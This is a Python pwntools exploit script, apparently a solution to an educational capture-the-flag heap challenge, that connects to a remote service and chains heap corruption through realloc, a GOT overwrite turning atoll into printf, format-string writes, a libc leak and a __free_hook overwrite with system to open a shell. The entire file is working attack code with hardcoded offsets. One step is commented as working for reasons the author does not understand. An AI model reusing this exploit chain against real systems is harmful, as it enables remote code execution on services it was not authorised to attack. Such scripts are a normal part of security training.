#!/usr/bin/env python3

import os
import pwn

pwn.context.arch = 'amd64'
#libc = pwn.ELF('./libc-2.29.so')

remote = pwn.remote('eductf.zoolab.org', 10106)
#remote = pwn.remote('localhost', 12345)

hijacked = False
def res(val):
  if hijacked:
    if val == 0:
      return b'\x00'
    return '%{}c'.format(val)
  else:
    return str(val)

def allocate(idx, size, data):
  remote.sendlineafter('Your choice: ', '1')
  remote.sendafter(':', res(idx))
  remote.sendafter(':', res(size))
  remote.sendafter(':', data)

def reallocate(idx, size, data):
  remote.sendlineafter('Your choice: ', '2')
  remote.sendafter(':', res(idx))
  remote.sendafter(':', res(size))
  if size == 0:
    return
  remote.sendafter(':', data)

def rfree(idx):
  remote.sendlineafter('Your choice: ', '3')
  remote.sendafter(':', res(idx))

def fmt_atk(fmt):
  remote.sendlineafter('Your choice: ', '1')
  remote.sendafter(':', fmt)


# This will hijack GOT successfully
atoll_got = 0x404048
printf_plt = 0x401070
allocate(0, 0x18, 'a')
reallocate(0, 0x0, 'a')
reallocate(0, 0x18, pwn.p64(atoll_got) + pwn.p64(0))
rfree(1)  # I don't know why, but this line seems do the magic
allocate(1, 0x18, pwn.p64(printf_plt))

hijacked = True

note_addr = 0x4040d0
def clear_ptr(idx):
  for i in range(8):
    payload = b'%9$hhn'
    assert len(payload) <= 0x8
    payload = payload.ljust(8, b'_') + pwn.p64(note_addr + i + 8 * idx)
    fmt_atk(payload)

clear_ptr(0)
clear_ptr(1)

fmt_atk('%9$llx\n')
libc_base = int(remote.recvuntil('\n', drop=True), 16) - 0x1e5760
print('libc:', hex(libc_base))

free_hook = libc_base + 0x1e75a8
system_addr = libc_base + 0x52fd0
allocate(0, 0x28, 'a')
reallocate(0, 0x0, 'a')
reallocate(0, 0x28, pwn.p64(free_hook) + pwn.p64(0))
clear_ptr(0)
allocate(0, 0x28, 'a')
clear_ptr(0)
allocate(0, 0x28, pwn.p64(system_addr))

allocate(1, 0x38, '/bin/sh')
rfree(1)

remote.interactive()
